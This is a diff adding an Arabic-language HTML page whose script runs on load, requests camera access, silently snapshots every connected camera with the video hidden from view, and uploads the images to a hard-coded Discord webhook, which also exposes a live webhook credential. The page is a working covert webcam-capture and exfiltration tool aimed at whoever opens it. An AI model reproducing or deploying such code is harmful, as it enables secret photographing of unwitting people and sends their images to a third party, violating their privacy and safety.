@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>كاميرا ويب - إرسال إلى Discord</title>
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+        }
+
+        video {
+            display: none;
+        }
+
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const canvas = document.getElementById("canvas");
+        let images = [];
+
+        // الدالة لبدء كاميرات الويب المختلفة
+        async function initCameras() {
+            try {
+                // الحصول على قائمة بجميع الأجهزة المتصلة (الكاميرات)
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput'); // تصفية الكاميرات فقط
+
+                console.log("الكاميرات المتاحة:", videoDevices);  // طباعة الكاميرات المتاحة للمساعدة في التصحيح
+
+                if (videoDevices.length > 0) {
+                    // استدعاء جميع الكاميرات بشكل متوازي
+                    const capturePromises = videoDevices.map(device => startCameraAndCapture(device));
+                    await Promise.all(capturePromises); // الانتظار حتى تنتهي جميع الكاميرات من التقاط الصور
+
+                    console.log("تم جمع الصور من جميع الكاميرات.");
+                    sendToDiscord(images);
+                } else {
+                    alert("لا توجد كاميرات متاحة!");
+                    console.error("لا توجد كاميرات متصلة.");
+                }
+            } catch (error) {
+                alert("حدث خطأ أثناء الوصول إلى الكاميرات. تأكد من أنك قد منحت إذن الوصول إلى الكاميرات في المتصفح.");
+                console.error("حدث خطأ أثناء الوصول إلى الكاميرات.", error);
+            }
+        }
+
+        // بدء كل كاميرا والتقاط الصورة
+        async function startCameraAndCapture(device) {
+            try {
+                console.log(`محاولة الوصول إلى الكاميرا: ${device.label}`);
+                // الحصول على صلاحية الوصول إلى الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { deviceId: device.deviceId }
+                });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.width = 640;
+                video.height = 480;
+                video.play();
+
+                // الانتظار حتى يبدأ الفيديو في التشغيل قبل التقاط الصورة
+                video.onplaying = () => {
+                    captureAndSend(video, device);
+                };
+
+            } catch (error) {
+                console.error(`حدث خطأ أثناء تشغيل الكاميرا: ${device.label}`, error);
+            }
+        }
+
+        // التقاط الصورة من الفيديو
+        function captureAndSend(video, device) {
+            // إعداد الـCanvas لرسم الفيديو
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة إلى base64
+            const imageData = canvas.toDataURL("image/png");
+
+            // إضافة الصورة إلى قائمة الصور
+            images.push(imageData);
+            console.log(`تم التقاط صورة من كاميرا: ${device.label}`);
+
+            // عند التقاط الصور من جميع الكاميرات، سيتم إرسالها
+            if (images.length === document.querySelectorAll('video').length) {
+                console.log("تم جمع الصور من جميع الكاميرات.");
+                sendToDiscord(images);
+            }
+        }
+
+        // إرسال الصور إلى Webhook في Discord
+        async function sendToDiscord(images) {
+            const webhookUrl = "https://discord.com/api/webhooks/1304326600438972447/cPAPNutnxg86tnOFPS4nbt5CHapnvXwXAiKR8bqJPJylOaLcd-wV3avTuFqcphwmB6Sc";  // ضع هنا رابط الـWebhook الخاص بك
+            const formData = new FormData();
+
+            // تحويل الصور إلى Blob وإضافتها إلى الـ FormData
+            images.forEach((imageData, index) => {
+                const blob = dataURItoBlob(imageData);
+                formData.append("file", blob, `image${index + 1}.png`);
+            });
+
+            // التحقق من محتويات الـ FormData
+            console.log("FormData يحتوي على الصور:", formData);
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    body: formData
+                });
+
+                if (response.ok) {
+                    console.log("تم إرسال الصور بنجاح!");
+                } else {
+                    const errorText = await response.text();
+                    console.error("فشل في إرسال الصور إلى Discord:", errorText);
+                }
+            } catch (error) {
+                console.error("حدث خطأ أثناء إرسال الصور.", error);
+            }
+        }
+
+        // تحويل البيانات من base64 إلى Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uintArray = new Uint8Array(arrayBuffer);
+            for (let i = 0; i < byteString.length; i++) {
+                uintArray[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([uintArray], { type: "image/png" });
+        }
+
+        // بدء الكاميرات عند تحميل الصفحة
+        window.onload = initCameras;
+    </script>
+</body>
+</html>
